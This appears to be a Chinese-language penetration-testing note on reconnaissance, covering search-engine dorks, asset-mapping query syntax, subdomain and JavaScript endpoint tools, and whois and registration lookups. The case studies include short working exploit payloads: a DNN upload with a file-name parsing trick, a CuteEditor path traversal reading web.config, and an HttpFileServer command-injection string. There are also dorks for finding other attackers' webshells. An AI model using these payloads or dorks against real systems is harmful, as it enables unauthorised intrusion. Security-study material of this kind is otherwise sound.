# 渗透测试信息收集

## 0x01 概述
>对于互联网上的网络目标信息收集，我往往希望找到一个和目标系统在同LAN的，并容易控守的服务器，甚至就是同一台服务器的应用漏洞，所以相关度、可控守难度两个属性就至关重要了。

现阶段的信息获取方式是，首先要锁定我们的最终目标，如果目标无法攻破，通过迂回包抄的方法。一是要关注同服务器其他应用，二是依照外网IP段和子域名相近性类推相关度，一层层向外拓展，直到找到可控守的目标进行内网拓展。

## 0x02 总体思路

1. 快速模式，快速找到漏洞点利用突破外网，进行内网渗透。
2. 普通模式，寻寻渐进进行普遍性收集，漏洞测试，寻找最优路径突破外网，进行内网渗透。

### 1. 快速模式

无论运用什么方式进行网络目标信息收集，我们首先就是要确定目标的网络的身份信息，也就是其域名、IP地址。   
通常情况下子域名应用与终极目标相关性高，同C段IP的应用有较高的相关性，需要进行判断。   

为了快速找到可攻破的目标，我们需要借助搜索引擎。   
信息获取的方法遵循快速有效，所以一般先通过，Google，zoomeye等搜索引擎利用技巧，快速查找相关应用（子域名和C段IP）是否存在易控守的漏洞。   （sturts2、Jboss、fckeditor等），进行突破。   
#### 1.GoogleHack   
- 思路一：查找易获取控制权限的漏洞查找，struts（s2-016...）、editor
- 思路二：找Hacked的网站，或者webshell
- 思路三：配置错误，可列目录或报错信息，这样获取更权限信息。
- 思路四：Admin后台。



#### 案例：   
##### DNN CMS   
搜索规则：`inurl:Portals/0/`

EXP: 
```
http://[PATH]/Providers/HtmlEditorProviders/Fck/fcklinkgallery.aspx
通过js调用上传功能： javascript:__doPostBack('ctlURL$cmdUpload','')
上传文件(存在asp解析漏洞)：Dz4aLL.asp;me.jpg
UploadRoot:Portals/0/
```

##### FCKEditor
>搜索规则：fckeitor

##### CuteEditor
>搜索规则： `inurl:CuteSoft_Client/`
EXP:   
```
CuteSoft_Client/CuteEditor/Load.ashx?type=image&file=../../../web.config
```

##### HttpFileServer
>搜索规则：  
intext:Servertime: HttpFileServer 2.3
intext:服务器时间: HttpFileServer 2.3

EXP:   
```
http://localhost:8080/?search==%00{.exec|cmd.exe /c  echo 123 > C:\1.txt.}
ttp://localhost:8080/?search==%00{.load|c:\1.txt.}
```

##### JBoss
>搜索规则：
inurl:status EJBInvokerServlet   
intitle:"tomcat status"   
inurl:jmx-console   
/invoker/JMXInvokerServlet   
status?full=true   
intitle:"tomcat status"  intext:"jbossupdate"   (webinfo console jsp_info.jsp log_info.jsp)   
/invoker/JMXInvokerServlet   
jmx-console   
web-console   


##### 列目录
>搜索规则：   
intext:转到父目录   
intitle:index of /   

##### 搜索别人的shell
>搜索规则：   
intitle:Phantom Hackers.PH intext:password filetype:php

#### 2. Zoomeye
类似的互联网资产搜索引擎还有：fofa.so,shodan.io等。    
要学会几个关键词的使用，icdr、country、app等

## 0x03 普通模式
锁定目标的网络位置（域名、IP地址），我就要开始逐渐拓展相关目标范围，并进行深度有效的信息收集。
### 1. 拓展网络目标范围
以点拓面
1. 同服务器其它Web应用
2. 主页链接网站
3. 子域名（2、3...级）
4. C段主机（或已知目标的IP段）
5. 移动App分析获取服务器地址
### 2. 获取基本信息
1. 位置信息（IP地址、域名）
2. 扫描开放端口、服务及版本
### 3. 深度挖掘信息
1. 识别设备类型
2. 识别操作系统
3. 识别Web容器
4. 识别Web应用(CMS)、组件及其版本
### 4. 漏洞测试
1. 已知漏洞测试
- Web
- Databse（Mysql、SQLserver）
- 远程管理（SSH、RDP）
2. 常见漏洞测试（主要是Web方向）
- 弱口令（常见的默认密码）
- SQLinject
- 文件包含
- 文件上传过滤不严格
- 模板注入
- 模板管理

## 0x04 现代信息收集工具链
> 0x02 的 GoogleHack/Zoomeye 思路至今有效，但主战场已换到 fofa/鹰图/Shodan 等测绘平台 + 自动化子域工具链。

### 1. fofa / 鹰图语法速查
```text
domain="target.com"
cert="target.com"           # 证书搜索
body="xxx" && title="后台"
icon_hash="xxx"             # favicon定位（绕CDN找真实IP）
app="Apache-Shiro" && country="CN"
host="target.com" && status_code="200"
region="beijing" && port="8080"
```

- shodan：`ssl.cert.subject.CN:"target.com"`、`http.title:"dashboard"`
- zoomeye：`app:"apache" +country:"CN"`
- 鹰图（奇安信 HUNTER）：`domain.suffix="target.com"`、`web.title="后台"`

### 2. 子域名枚举工具链
- subfinder：被动枚举，`subfinder -d target.com -silent`
- [OneForAll](https://github.com/shmilylty/OneForAll)：`python oneforall.py --target target.com run`，多引擎+爆破+接管检测一把梭
- crt.sh 证书透明度：`https://crt.sh/?q=%25.target.com`
- httpx 存活验证联动：`subfinder -d target.com -silent | httpx -title -tech-detect -status-code`

### 3. JS 信息分析
- [JSFinder](https://github.com/Threezh1/JSFinder)：从页面 JS 中提取 URL/API 端点，找隐藏接口与后台
- [LinkFinder](https://github.com/GerbenJavado/LinkFinder)：`python linkfinder.py -i https://target.com -d -o cli`，正则提取端点
- source map 泄露：探测 `.js.map`（如 `app.js.map`），可完整还原源码（原始路径、注释、密钥）
- JS 中的 AK/SK、API Key、JWT secret 等密钥泄露衔接 [EXP-InfoLeak](../exp/EXP-InfoLeak.md)

### 4. Whois 与备案
- `whois target.com`：注册人、邮箱、NS、注册商；注册邮箱可反查同一人名下其他域名
- ICP 备案查询：工信部 `beian.miit.gov.cn` / `beianx.cn`，确认主体公司后以主体名再扩资产
- 域名/解析历史：SecurityTrails（子域与解析记录历史）、微步在线（ThreatBook）
- 邮箱反查：hunter.io 按域名搜关联邮箱，用于钓鱼与资产归属确认

### 5. 与 PEN-Scanner 的分工
本文只管"收集"（找目标、找入口、找泄露），端口/服务/漏洞级的批量扫描见 [PEN-Scanner](./PEN-Scanner.md)。

## 0x05 注意事项

- 信息收集阶段的重点是缩小突破面，不是把所有目标都扫一遍。
- 先做相关性判断，再做漏洞验证，能减少无效目标和噪声。
- 搜索引擎结果适合做入口发现，版本识别和漏洞判断仍要靠二次验证。

## Ref
- [fofa 查询语法官方文档](https://fofa.info/)
- [subfinder](https://github.com/projectdiscovery/subfinder)
- [OneForAll](https://github.com/shmilylty/OneForAll)
- [JSFinder](https://github.com/Threezh1/JSFinder)
- [LinkFinder](https://github.com/GerbenJavado/LinkFinder)
